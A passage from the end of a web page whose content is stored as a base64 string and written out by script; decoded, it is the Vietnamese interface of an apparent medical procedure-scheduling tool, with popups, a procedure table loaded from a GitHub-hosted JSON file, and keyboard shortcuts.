WxpZ24taXRlbXM6Y2VudGVyO2p1c3RpZnktY29udGVudDpzcGFjZS1iZXR3ZWVuO3BhZGRpbmc6MTBweCAxMnB4O2JvcmRlci1ib3R0b206MXB4IHNvbGlkICNlNWU3ZWIiPg0KICAgICAgPHN0cm9uZz5U4bqhbyBnaeG7nSB0aOG7pyB0aHXhuq10PC9zdHJvbmc+DQogICAgICA8ZGl2IHN0eWxlPSJkaXNwbGF5OmZsZXg7Z2FwOjZweCI+DQogICAgICAgIDxidXR0b24gY2xhc3M9ImJ0biIgb25jbGljaz0icmVsb2FkUHJvY2VkdXJlU2NoZWR1bGVyKCkic3R5bGU9InBhZGRpbmc6OHB4IDE0cHg7Zm9udC1zaXplOjEzcHg7Ym9yZGVyLXJhZGl1czo0cHg7Ij5Mw6BtIG3hu5tpPC9idXR0b24+DQogICAgICAgIDxidXR0b24gY2xhc3M9ImJ0biIgb25jbGljaz0iY2xvc2VQcm9jZWR1cmVTY2hlZHVsZXIoKSJzdHlsZT0icGFkZGluZzo4cHggMTRweDtmb250LXNpemU6MTNweDtib3JkZXItcmFkaXVzOjRweDsiPsSQw7NuZzwvYnV0dG9uPg0KICAgICAgPC9kaXY+DQogICAgPC9kaXY+DQogICAgPGlmcmFtZSBpZD0icHJvY2VkdXJlRnJhbWUiIHNyYz0iYWJvdXQ6YmxhbmsiIHN0eWxlPSJmbGV4OjE7d2lkdGg6MTAwJTtib3JkZXI6MCIgYWxsb3dmdWxsc2NyZWVuPjwvaWZyYW1lPg0KICA8L2Rpdj4NCjwvZGl2PjxzY3JpcHQ+DQogIGZ1bmN0aW9uIG9wZW5Qcm9jZWR1cmVTY2hlZHVsZXIoKSB7DQogICAgY29uc3QgbW9kYWwgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncHJvY2VkdXJlRnJhbWVNb2RhbCcpOw0KICAgIGNvbnN0IGZyYW1lID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Byb2NlZHVyZUZyYW1lJyk7DQogICAgZnJhbWUuc3JjID0gJ2h0dHBzOi8vY2hhdWh1eW5oMDEwNC5naXRodWIuaW8vZ3ltL2x0dC5odG1sJzsNCiAgICBtb2RhbC5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgfQ0KICBmdW5jdGlvbiByZWxvYWRQcm9jZWR1cmVTY2hlZHVsZXIoKSB7DQogICAgY29uc3QgZnJhbWUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncHJvY2VkdXJlRnJhbWUnKTsNCiAgICBpZiAoZnJhbWUgJiYgZnJhbWUuY29udGVudFdpbmRvdykgew0KICAgICAgdHJ5IHsgZnJhbWUuY29udGVudFdpbmRvdy5sb2NhdGlvbi5yZWxvYWQoKTsgfQ0KICAgICAgY2F0Y2ggKF8pIHsgZnJhbWUuc3JjID0gZnJhbWUuc3JjOyB9DQogICAgfQ0KICB9DQogIGZ1bmN0aW9uIGNsb3NlUHJvY2VkdXJlU2NoZWR1bGVyKCkgew0KICAgIGNvbnN0IG1vZGFsID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Byb2NlZHVyZUZyYW1lTW9kYWwnKTsNCiAgICBjb25zdCBmcmFtZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwcm9jZWR1cmVGcmFtZScpOw0KICAgIGZyYW1lLnNyYyA9ICdhYm91dDpibGFuayc7DQogICAgbW9kYWwuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgfQ0KPC9zY3JpcHQ+DQoNCjwhLS0gUE9QVVAgVFXhu7IgQknhur5OIFRI4bumIFRIVeG6rFQgLS0+DQo8ZGl2IGlkPSJjdXN0b21pemVNb2RhbCIgc3R5bGU9ImRpc3BsYXk6bm9uZTtwb3NpdGlvbjpmaXhlZDtpbnNldDowO3otaW5kZXg6MTEwNjA7Ij4NCiAgPGRpdiBzdHlsZT0icG9zaXRpb246YWJzb2x1dGU7aW5zZXQ6MDtiYWNrZ3JvdW5kOnJnYmEoMCwwLDAsMC41KSIgb25jbGljaz0iY2xvc2VDdXN0b21pemVQYW5lbCgpIj48L2Rpdj4NCiAgPGRpdiBzdHlsZT0iDQogICAgICBwb3NpdGlvbjphYnNvbHV0ZTt0b3A6OCU7bGVmdDo1MCU7dHJhbnNmb3JtOnRyYW5zbGF0ZVgoLTUwJSk7DQogICAgICB3aWR0aDptaW4oODIwcHgsOTJ2dyk7bWF4LWhlaWdodDo4NHZoO292ZXJmbG93OmF1dG87DQogICAgICBiYWNrZ3JvdW5kOiNmZmY7Y29sb3I6IzAwMDtib3JkZXItcmFkaXVzOjEwcHg7Ym9yZGVyOjJweCBzb2xpZCAjMzQ5OGRiOw0KICAgICAgYm94LXNoYWRvdzowIDhweCAyNHB4IHJnYmEoMCwwLDAsLjI1KTtmb250LWZhbWlseTpJbnRlcixzYW5zLXNlcmlmIj4NCiAgPGRpdiBzdHlsZT0iZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmNlbnRlcjtqdXN0aWZ5LWNvbnRlbnQ6c3BhY2UtYmV0d2VlbjsNCiAgICAgICAgICAgIHBhZGRpbmc6MTRweCAxNnB4O2JvcmRlci1ib3R0b206MXB4IHNvbGlkICNlNWU3ZWIiPg0KICA8aDMgc3R5bGU9Im1hcmdpbjowO2ZvbnQtc2l6ZToxOHB4Ij5C4bqjbmcgVHXhu7MgYmnhur9uIFRo4bunIHRodeG6rXQ8L2gzPg0KICA8ZGl2IHN0eWxlPSJkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2p1c3RpZnktY29udGVudDpmbGV4LWVuZDtnYXA6NnB4OyI+DQogIDxidXR0b24gY2xhc3M9ImJ0biIgb25jbGljaz0ic2hvd05vUGVybWlzc2lvbigpIg0KICAgICAgICAgIHN0eWxlPSJwYWRkaW5nOjhweCAxNHB4O2ZvbnQtc2l6ZToxM3B4O2JvcmRlci1yYWRpdXM6NHB4OyI+DQogICAgVGjDqm0NCiAgPC9idXR0b24+DQogIDxidXR0b24gY2xhc3M9ImJ0biIgb25jbGljaz0iY2xvc2VDdXN0b21pemVQYW5lbCgpIg0KICAgICAgICAgIHN0eWxlPSJwYWRkaW5nOjhweCAxNHB4O2ZvbnQtc2l6ZToxM3B4O2JvcmRlci1yYWRpdXM6NHB4OyI+DQogICAgxJDDs25nDQogIDwvYnV0dG9uPg0KPC9kaXY+DQo8L2Rpdj4NCiAgICA8ZGl2IHN0eWxlPSJwYWRkaW5nOjBweCAxNnB4Ij4NCiAgICANCiAgICAgIDx0YWJsZSBjbGFzcz0iZXJyb3ItdGFibGUiIHN0eWxlPSJ3aWR0aDoxMDAlIj4NCiAgICAgICAgPHRoZWFkPg0KICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgIDx0aCBzdHlsZT0id2lkdGg6NjBweCI+U1RUPC90aD4NCiAgICAgICAgICAgIDx0aD5UaOG7pyBUaHXhuq10PC90aD4NCiAgICAgICAgICAgIDx0aCBzdHlsZT0id2lkdGg6MTMwcHgiPlRo4budaSBnaWFuPC90aD4NCiAgICAgICAgICAgIDx0aCBzdHlsZT0id2lkdGg6MTEwcHgiPkNodeG6qW4gYuG7izwvdGg+DQogICAgICAgICAgPC90cj4NCiAgICAgICAgPC90aGVhZD4NCiAgICAgICAgPHRib2R5IGlkPSJjdXN0b21pemVCb2R5Ij48L3Rib2R5Pg0KICAgICAgPC90YWJsZT4NCiAgDQogIDwvZGl2Pg0KPC9kaXY+DQo8c2NyaXB0Pg0KICBjb25zdCBUSFVUSFVBVF9VUkwgPSAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoYXVodXluaDAxMDQvY2hhdWh1eW5oMDEwNC50eHQvcmVmcy9oZWFkcy9tYWluL2NoYXVfdGh1dGh1YXQudHh0JzsNCg0KICBhc3luYyBmdW5jdGlvbiBvcGVuQ3VzdG9taXplUGFuZWwoKSB7DQogICAgdHJ5IHsNCiAgICAgIGlmICghd2luZG93LlBST0NFRFVSRVMgfHwgT2JqZWN0LmtleXMod2luZG93LlBST0NFRFVSRVMpLmxlbmd0aCA9PT0gMCkgew0KICAgICAgICBjb25zdCByZXMgPSBhd2FpdCBmZXRjaChUSFVUSFVBVF9VUkwpOw0KICAgICAgICBjb25zdCB0ZXh0ID0gYXdhaXQgcmVzLnRleHQoKTsNCiAgICAgICAgd2luZG93LlBST0NFRFVSRVMgPSBKU09OLnBhcnNlKHRleHQpOw0KICAgICAgfQ0KICAgIH0gY2F0Y2ggKGUpIHsNCiAgICAgIGFsZXJ0KCdLaMO0bmcgdGjhu4MgdOG6o2kgZGFuaCBzw6FjaCB0aOG7pyB0aHXhuq10IHThu6sgbcOheSBjaOG7py4nKTsNCiAgICAgIHJldHVybjsNCiAgICB9DQoNCiAgICBjb25zdCByb3dzID0gW107DQogICAgT2JqZWN0LmVudHJpZXMoUFJPQ0VEVVJFUykuZm9yRWFjaCgoW25hbWUsIGNmZ10pID0+IHsNCiAgICAgIGlmICghbmFtZSB8fCAhY2ZnKSByZXR1cm47DQoNCiAgIC8vIHRyxrDhu5tjIMSRw7M6DQpsZXQgZHVyYXRpb24gPSAodHlwZW9mIGNmZy5kdXJhdGlvbiA9PT0gJ251bWJlcicpID8gY2ZnLmR1cmF0aW9uIDogJyc7DQovLyBO4bq/dSBjw7MgcHJlcCB0aMOsIGzhuqV5IHByZXAsIG7hur91IGtow7RuZyBjw7MgdGjDrCBnw6FuID0gZHVyYXRpb24NCmxldCBwcmVwID0gKHR5cGVvZiBjZmcucHJlcCA9PT0gJ251bWJlcicpID8gY2ZnLnByZXAgOiBkdXJhdGlvbjsNCg0KLy8gw6lwIHJpw6puZyBjaG8gIlPhuq9jIHRodeG7kWMgdGhhbmciDQppZiAobmFtZS50cmltKCkudG9Mb3dlckNhc2UoKS5pbmNsdWRlcygnc+G6r2MgdGh14buRYyB0aGFuZycpKSB7DQogIGR1cmF0aW9uID0gMTIwOw0KICBwcmVwID0gMTIwOw0KfQ0KDQoNCiAgICAgIGlmIChkdXJhdGlvbiAhPT0gJycpIHsNCiAgICAgICAgcm93cy5wdXNoKHsgbmFtZSwgZHVyYXRpb24sIHByZXAgfSk7DQogICAgICB9DQogICAgfSk7DQoNCiAgICByb3dzLnNvcnQoKGEsYikgPT4gYS5uYW1lLmxvY2FsZUNvbXBhcmUoYi5uYW1lLCAndmknKSk7DQoNCiAgICBjb25zdCB0Ym9keSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjdXN0b21pemVCb2R5Jyk7DQogICAgdGJvZHkuaW5uZXJIVE1MID0gcm93cy5tYXAoKHIsIGlkeCkgPT4gYA0KICAgICAgPHRyPg0KICAgICAgICA8dGQgc3R5bGU9InRleHQtYWxpZ246Y2VudGVyIj4ke2lkeCArIDF9PC90ZD4NCiAgICAgICAgPHRkPiR7ci5uYW1lfTwvdGQ+DQogICAgICAgIDx0ZCBzdHlsZT0idGV4dC1hbGlnbjpjZW50ZXIiPiR7ci5kdXJhdGlvbn08L3RkPg0KICAgICAgICA8dGQgc3R5bGU9InRleHQtYWxpZ246Y2VudGVyIj4ke3IucHJlcH08L3RkPg0KICAgICAgPC90cj4NCiAgICBgKS5qb2luKCcnKTsNCg0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjdXN0b21pemVNb2RhbCcpLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICB9DQoNCiAgZnVuY3Rpb24gY2xvc2VDdXN0b21pemVQYW5lbCgpIHsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnY3VzdG9taXplTW9kYWwnKS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICB9DQo8L3NjcmlwdD4NCjxzY3JpcHQ+DQpmdW5jdGlvbiBzaG93Tm9QZXJtaXNzaW9uKCkgew0KICAvLyBPdmVybGF5DQogIGNvbnN0IG92ZXJsYXkgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgb3ZlcmxheS5zdHlsZS5jc3NUZXh0ID0gYA0KICAgIHBvc2l0aW9uOmZpeGVkO2luc2V0OjA7YmFja2dyb3VuZDpyZ2JhKDAsMCwwLDAuNSk7DQogICAgZGlzcGxheTpmbGV4O2p1c3RpZnktY29udGVudDpjZW50ZXI7YWxpZ24taXRlbXM6Y2VudGVyO3otaW5kZXg6MTIwMDA7DQogIGA7DQoNCiAgLy8gQm94DQogIGNvbnN0IGJveCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOw0KICBib3guc3R5bGUuY3NzVGV4dCA9IGANCiAgICBiYWNrZ3JvdW5kOiNmZmY7cGFkZGluZzoyMHB4IDMwcHg7Ym9yZGVyLXJhZGl1czoxMHB4Ow0KICAgIHRleHQtYWxpZ246Y2VudGVyO21heC13aWR0aDozMjBweDtib3gtc2hhZG93OjAgNHB4IDE1cHggcmdiYSgwLDAsMCwwLjMpOw0KICAgIGZvbnQtZmFtaWx5OkludGVyLHNhbnMtc2VyaWY7DQogIGA7DQogIGJveC5pbm5lckhUTUwgPSBgDQogICAgPGRpdiBzdHlsZT0iZm9udC1zaXplOjE4cHg7Zm9udC13ZWlnaHQ6NjAwO2NvbG9yOiNlNzRjM2M7bWFyZ2luLWJvdHRvbToxMHB4OyI+DQogICAgICDwn5qrIELhuqFuIGtow7RuZyBjw7MgcXV54buBbiB0aMOqbSB0aOG7pyB0aHXhuq10DQogICAgPC9kaXY+DQogICAgPGJ1dHRvbiBjbGFzcz0iYnRuIiBvbmNsaWNrPSJkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKHRoaXMuY2xvc2VzdCgnLm5vUGVybU92ZXJsYXknKSkiPg0KICAgICAgxJDDs25nDQogICAgPC9idXR0b24+DQogIGA7DQogIG92ZXJsYXkuY2xhc3NMaXN0LmFkZCgibm9QZXJtT3ZlcmxheSIpOw0KICBvdmVybGF5LmFwcGVuZENoaWxkKGJveCk7DQogIG92ZXJsYXkuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBlID0+IHsNCiAgICBpZiAoZS50YXJnZXQgPT09IG92ZXJsYXkpIGRvY3VtZW50LmJvZHkucmVtb3ZlQ2hpbGQob3ZlcmxheSk7DQogIH0pOw0KICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKG92ZXJsYXkpOw0KfQ0KDQoNCg0KPC9zY3JpcHQ+DQoNCg0KDQoNCg0KDQoNCg0KDQoNCjxzY3JpcHQ+DQpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIGZ1bmN0aW9uKGUpIHsNCiAgaWYgKGUudGFyZ2V0ICYmIGUudGFyZ2V0LmlkID09PSAiYnV5Iikgew0KICAgIGUucHJldmVudERlZmF1bHQoKTsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiYnV5UG9wdXAiKS5zdHlsZS5kaXNwbGF5ID0gImZsZXgiOw0KICB9DQp9KTsNCmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgZnVuY3Rpb24oZSkgew0KICAvLyBN4bufIHBvcHVwIGLhuqNuZyBnacOhIG7hur91IGNsaWNrIHbDoG8gbsO6dCBpZD1idXkNCiAgaWYgKGUudGFyZ2V0ICYmIGUudGFyZ2V0LmlkID09PSAiYnV5Iikgew0KICAgIGUucHJldmVudERlZmF1bHQoKTsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiYnV5UG9wdXAiKS5zdHlsZS5kaXNwbGF5ID0gImZsZXgiOw0KICAgIHJldHVybjsNCiAgfQ0KDQogIC8vIMSQw7NuZyBwb3B1cCBraGkgY2xpY2sgcmEgbmdvw6BpIHBo4bqnbiBu4buZaSBkdW5nDQogIGNvbnN0IHBvcHVwcyA9IFsiYnV5UG9wdXAiLCAicGF5bWVudFBvcHVwIiwgImNvbmZpcm1Qb3B1cCJdOw0KICBwb3B1cHMuZm9yRWFjaChpZCA9PiB7DQogICAgY29uc3QgcG9wdXAgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZChpZCk7DQogICAgaWYgKHBvcHVwICYmIHBvcHVwLnN0eWxlLmRpc3BsYXkgPT09ICJmbGV4IiAmJiBlLnRhcmdldCA9PT0gcG9wdXApIHsNCiAgICAgIHBvcHVwLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7DQogICAgfQ0KICB9KTsNCn0pOw0KDQovLyDEkGnhu4F1IGjGsOG7m25nIG5oYW5oIGLhurFuZyBwaMOtbSBz4buRDQpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdrZXlkb3duJywgZnVuY3Rpb24oZSkgew0KICAgIGlmIChlLmNvZGUgPT09ICJGNiIpIHsNCiAgICAgICAgZS5wcmV2ZW50RGVmYXVsdCgpOw0KICAgICAgICBjb25zdCBjaGVja2JveCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzaG93TW9yZVN1Z2dlc3Rpb25zQ2hlY2tib3gnKTsNCiAgICAgICAgaWYgKGNoZWNrYm94KSB7DQogICAgICAgICAgICBjaGVja2JveC5jaGVja2VkID0gIWNoZWNrYm94LmNoZWNrZWQ7DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIEvDrWNoIGhv4bqhdCBz4buxIGtp4buHbiBjaGFuZ2UgxJHhu4MgY+G6rXAgbmjhuq10IGdpYW8gZGnhu4duDQogICAgICAgICAgICBjb25zdCBldmVudCA9IG5ldyBFdmVudCgnY2hhbmdlJyk7DQogICAgICAgICAgICBjaGVja2JveC5kaXNwYXRjaEV2ZW50KGV2ZW50KTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgDQogICAgICAgIH0NCiAgICB9DQogICAgDQogICAgLy8gRjcgLSBUb2dnbGUgY2hlY2tib3ggIkhp4buDbiB0aOG7iyBCw6FjIHPEqSBjaOG7iSDEkeG7i25oIg0KICAgIGlmIChlLmNvZGUgPT09ICJGNyIpIHsNCiAgICAgICAgZS5wcmV2ZW50RGVmYXVsdCgpOw0KICAgICAgICBjb25zdCBjaGVja2JveCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzaG93RG9jdG9yQ2hlY2tib3gnKTsNCiAgICAgICAgaWYgKGNoZWNrYm94KSB7DQogICAgICAgICAgICBjaGVja2JveC5jaGVja2VkID0gIWNoZWNrYm94LmNoZWNrZWQ7DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIEvDrWNoIGhv4bqhdCBz4buxIGtp4buHbiBjaGFuZ2UgxJHhu4MgY+G6rXAgbmjhuq10IGdpYW8gZGnhu4duDQogICAgICAgICAgICBjb25zdCBldmVudCA9IG5ldyBFdmVudCgnY2hhbmdlJyk7DQogICAgICAgICAgICBjaGVja2JveC5kaXNwYXRjaEV2ZW50KGV2ZW50KTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgDQogICAgICAgIH0NCiAgICB9DQoNCiAgICAvLyA9PT09IE1BUCBDw4FDIELhuqJORyA9PT09DQogICAgY29uc3Qgc2VjdGlvbk1hcCA9IHsNCiAgICAgICAgIkYxIjogImVycm9yU2VjdGlvbiIsDQogICAgICAgICJGMiI6ICJyZXN1bHRTZWN0aW9uIiwNCiAgICAgICAgIkYzIjogIm1hY2hpbmVFcnJvclNlY3Rpb24iLA0KICAgICAgICAiRjQiOiAibWFjaGluZUNvbmZsaWN0U2VjdGlvbiIsDQogICAgICAgICJGNSI6ICJtaXNzaW5nTWFjaGluZVNlY3Rpb24iDQogICAgfTsNCg0KICAgIC8vID09PT0gU3BhY2Ug4oaSIFJlbG9hZCB0cmFuZyA9PT09DQogICAgaWYgKGUuY29kZSA9PT0gIlNwYWNlIikgew0KICAgICAgICBlLnByZXZlbnREZWZhdWx0KCk7DQogICAgICAgIGxvY2F0aW9uLnJlbG9hZCgpOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KDQogICAgLy8gPT09PSBDdHJsICsgMS8yLzMg4oaSIEzhu41jIHRoZW8gdMOqbiA9PT09DQogICAgY29uc3QgZmlsdGVyTWFwID0gew0KICAgICAgICAiMSI6ICJIdeG7s25oIE5n4buNYyBDaMOidSIsDQogICAgICAgICIyIjogIk5ndXnhu4VuIFRo4buLIFBoxrDGoW5nIiwNCiAgICAgICAgIjMiOiAiTmd1eeG7hW4gSG/DoGkgUGjGsMahbmciDQogICAgfTsNCg0KICAgIGlmIChlLmN0cmxLZXkgJiYgZmlsdGVyTWFwW2Uua2V5XSkgew0KICAgICAgICBjb25zdCBuYW1lID0gZmlsdGVyTWFwW2Uua2V5XTsNCiAgICAgICAgY29uc3Qgc2VsZWN0cyA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoInNlbGVjdCIpOw0KDQogICAgICAgIHNlbGVjdHMuZm9yRWFjaChzZWwgPT4gew0KICAgICAgICAgICAgZm9yIChsZXQgb3B0aW9uIG9mIHNlbC5vcHRpb25zKSB7DQogICAgICAgICAgICAgICAgaWYgKG9wdGlvbi50ZXh0LnRyaW0oKSA9PT0gbmFtZSkgew0KICAgICAgICAgICAgICAgICAgICBzZWwudmFsdWUgPSBvcHRpb24udmFsdWU7DQogICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfSk7DQoNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCg0KICAgIC8vID09PT0gQ3RybCArIE8g4oaSIE3hu58gZmlsZSA9PT09DQogICAgaWYgKGUuY3RybEtleSAmJiAhZS5zaGlmdEtleSAmJiBlLmtleS50b0xvd2VyQ2FzZSgpID09PSAibyIpIHsNCiAgICAgICAgZS5wcmV2ZW50RGVmYXVsdCgpOw0KICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgidHJpZ2dlckJ1dHRvbiIpPy5jbGljaygpOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KDQogICAgLy8gPT09PSBDdHJsICsgU2hpZnQgKyBPIOKGkiBN4bufIHRoxrAgbeG7pWMgPT09PQ0KICAgIGlmIChlLmN0cmxLZXkgJiYgZS5zaGlmdEtleSAmJiBlLmtleS50b0xvd2VyQ2FzZSgpID09PSAibyIpIHsNCiAgICAgICAgZS5wcmV2ZW50RGVmYXVsdCgpOw0KICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZm9sZGVyQnRuIik/LmNsaWNrKCk7DQogICAgICAgIHJldHVybjsNCiAgICB9DQoNCiAgICAvLyA9PT09IE7hur91IGtow7RuZyBwaOG6o2kgRjHigJNGNSB0aMOsIGLhu48gcXVhID09PT0NCiAgICBpZiAoIVsiRjEiLCJGMiIsIkYzIiwiRjQiLCJGNSJdLmluY2x1ZGVzKGUua2V5KSkgcmV0dXJuOw0KDQogICAgY29uc3QgdGFyZ2V0SWQgPSBzZWN0aW9uTWFwW2Uua2V5XTsNCiAgICBjb25zdCB0YXJnZXQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCh0YXJnZXRJZCk7DQogICAgaWYgKCF0YXJnZXQpIHJldHVybjsNCg0KICAgIC8vIOKchSBO4bq/dSBDYXBzTG9jayBi4bqtdCDihpIg4bqobiBo4bq/dCAmIGNo4buJIGhp4buHbiAxIGLhuqNuZw0KICAgIGlmIChlLmdldE1vZGlmaWVyU3RhdGUoIkNhcHNMb2NrIikpIHsNCiAgICAgICAgT2JqZWN0LnZhbHVlcyhzZWN0aW9uTWFwKS5mb3JFYWNoKHNlYyA9PiB7DQogICAgICAgICAgICBjb25zdCBlbCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKHNlYyk7DQogICAgICAgICAgICBpZiAoZWwpIGVsLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgICAgIH0pOw0KICAgICAgICB0YXJnZXQuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgfQ0KDQogICAgLy8g4pyFIEx1w7RuIHNjcm9sbCB04bubaSBi4bqjbmcNCiAgICB0YXJnZXQuc2Nyb2xsSW50b1ZpZXcoeyBiZWhhdmlvcjogJ3Ntb290aCcsIGJsb2NrOiAnc3RhcnQnIH0pOw0KDQp9KTsNCg0KDQovLyBUaMOqbSBz4buxIGtp4buHbiBjaG8gY2hlY2tib3ggc2hvd0RvY3RvciDEkeG7gyBj4bqtcCBuaOG6rXQgdOG6pXQgY+G6oyBjw6FjIGLhuqNuZw0KZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Nob3dEb2N0b3JDaGVja2JveCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGZ1bmN0aW9uKCkgew0KICAgIC8vIEPhuq1wIG5o4bqtdCBjw6FjIGLhuqNuZyBtw6F5DQogICAgaWYgKG1hY2hpbmVFcnJvckxvZy5sZW5ndGggPiAwKSBkaXNwbGF5TWFjaGluZUVycm9ycygpOw0KICAgIGlmIChtYWNoaW5lQ29uZmxpY3RMb2cubGVuZ3RoID4gMCkgZGlzcGxheU1hY2hpbmVDb25mbGljdHMoKTsNCiAgICBpZiAobWlzc2luZ01hY2hpbmVMb2cubGVuZ3RoID4gMCkgZGlzcGxheU1pc3NpbmdNYWNoaW5lRXJyb3JzKCk7DQp9KTsNCg0KPC9zY3JpcHQ+DQo8L2h0bWw+";
  const binary = atob(base64);
  const bytes = new Uint8Array([...binary].map(c => c.charCodeAt(0)));
  const decoded = new TextDecoder("utf-8").decode(bytes);
  document.write(decoded);
</script>
</body>
</html>
